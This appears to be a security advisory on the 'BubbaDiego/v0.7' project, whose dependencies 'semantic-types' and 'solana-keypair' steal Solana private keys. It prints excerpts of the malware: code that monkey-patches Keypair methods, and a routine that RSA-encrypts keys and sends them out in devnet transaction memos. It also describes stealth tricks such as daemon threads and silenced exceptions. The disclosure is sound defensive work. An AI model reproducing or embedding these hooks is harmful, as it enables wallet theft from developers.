**Malicious Dependency Risk in "BubbaDiego/v0.7" Project**  

The "BubbaDiego/v0.7" project depends on the following two packages:  

- "semantic-types"  
- "solana-keypair" 

![image-20250621150922104](https://github.com/user-attachments/assets/339ed16f-ad33-47ad-b9ae-eb9dd4088ec6)

"semantic-types" is the core malicious package containing a key-stealing payload, while "solana-keypair" serves as a camouflage package. It depends on the core package and automatically installs the malicious payload through transitive dependency mechanisms. Below is an introduction to the malicious behaviors of the "semantic-types" package.  

The "semantic-types" package tampers with the `Keypair` class in Solana's development libraries to stealthily steal key data when users create key pairs, encrypting and transmitting it to an attacker-controlled address via blockchain transactions. The specific analysis is as follows:  


1. Key Pair Generation Hijacking Mechanism
   "semantic-types" monitors the key generation process by tampering with the core methods of `solders.keypair.Keypair`:  

   - Method Redirection: Renames original methods (e.g., `from_base58_string`) to double-underscore aliases (e.g., `__hx__`), then overrides the original methods with malicious ones.  
   - Data Interception: Each time a key generation method is called, it triggers a background thread to send the generated private key to an external server.  

    ```python
    # Key method hijacking logic  
    method_pairs = [  
        ("from_base58_string", "__hx__"),  
        ("from_bytes", "__lo__"),  
        ("from_seed", "__rl__"),  
        # Other methods...  
    ]  
   
    for original, alias in method_pairs:  
        # Back up the original method  
        setattr(Keypair, alias, getattr(Keypair, original))  
        # Override the original method with a malicious one  
        setattr(Keypair, original, augment_func(getattr(Keypair, alias)))  
    ```


2. Private Key Encryption and Data Exfiltration
   The `transmit` function encrypts the stolen private key and sends it externally:  

    - Encryption Processing: Uses a hardcoded RSA public key to encrypt the private key, preventing interception during transmission.  
    - Disguised Transmission: Encapsulates the encrypted private key in the `memo` field of a Solana transaction, sending it via the testnet (`devnet`) to mimic normal transactions.  

    ```python
    def transmit(kp_bytes):  
        # Encrypt the private key with a hardcoded RSA public key  
        encrypted = cipher.encrypt(kp_bytes)  
   
        # Construct a transaction containing the encrypted private key  
        memo_ix = create_memo(MemoParams(  
            message=base64.b64encode(encrypted),  
            signer=sender.pubkey(),  
            program_id=MEMO_PROGRAM_ID  
        ))  
   
        # Send the transaction to the testnet  
        client.send_transaction(tx, opts=TxOpts(skip_preflight=True))  
    ```


3. Stealth Design and Attack Flow

   - Daemon Thread: Uses a daemon thread (`daemon=True`) to execute data transmission, non-blocking and auto-destroying when the process ends.  

   - Silent Exception Handling: Uses broad exception catching (`except: pass`) to ensure failed transmissions do not throw exceptions, avoiding user detection.  

   - Attack Flow: User generates a key pair → Malicious hooks are triggered → Private key is encrypted → Disguised as transaction data and sent → Attacker collects and decrypts the private key via the testnet.  

Notably, while the core malicious package "semantic-types" and the camouflage package "solana-keypair" have been removed from official package repositories, they still widely exist in some third-party mirrors. Therefore, installing the "BubbaDiego/v0.7" project from third-party mirrors may still lead to downloading versions with malicious dependencies, posing significant security risks.
